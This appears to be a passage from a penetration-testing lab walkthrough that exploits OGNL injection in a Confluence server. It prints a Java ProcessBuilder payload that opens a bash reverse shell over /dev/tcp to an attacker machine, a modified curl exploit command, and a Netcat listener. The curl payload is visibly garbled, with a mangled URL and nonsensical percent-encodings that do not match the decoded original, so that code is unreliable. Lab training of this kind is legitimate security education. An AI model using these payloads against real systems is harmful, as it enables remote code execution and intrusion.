```
/${new javax.script.EngineManager().getByName('nashorn').eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i > /dev/tcp/10.0.0.28/1270 0>&1').start")
```

Listing 519 - The example payload decoded

The URL path is an OGNL injection. OGNL is Object-Graph Notation Language, an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGN expression parser. Since it is possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection itself uses Java's ProcessBuilder class to spawn a Bash interactive shell (bash -i).

This proof-of-concept payload is almost perfect for our needs. However we need to modify it before we can use it. This is for two reasons: First, the Confluence server that we are pointing to in the original payload is not our vulnerable Confluence server. Second, the Bash reverse shell is pointing to port 1270 on 10.0.0.28, which is not our Kali machine. We need to modify these parameters in the payload before we can exploit CONFLUENCE01 and return a shell to our Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ") are not encoded. Although it's not always the case, for this particular exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. Means we cannot apply URL encoding across the whole payload we've modified.

Keeping this in mind, we will manually modify the parameters we need, using the Confluence server ip 192.168.50.63, and the Bash interface ip and port to a listener we are going to open on our Kali machine (/dev/tcp/192.168.118.4/4444). We also remove the curl verbosity flag. This leaves us with the following payload:

```
curl
http192.168.50.63%3B%29javax.script.EngineManager%2829.getByName%2829nashorn%2829.eval%28%29java.lang.ProcessBuilder%2829.command%28%29bash%272C%27-c%27bash%20-2i%20gt%3E%2Fdev%2Ftcp%2F192.168.118.4%2F4444%200%33%26%21%27%29start%28%29%22%29%7D/
```

Now that our payload is customized for our case, we can use a Netcat listener on our Kali machine on port 4444.

```
kali@kali:$ nc -nvlp 4444
listening on [any] 4444 ...
```
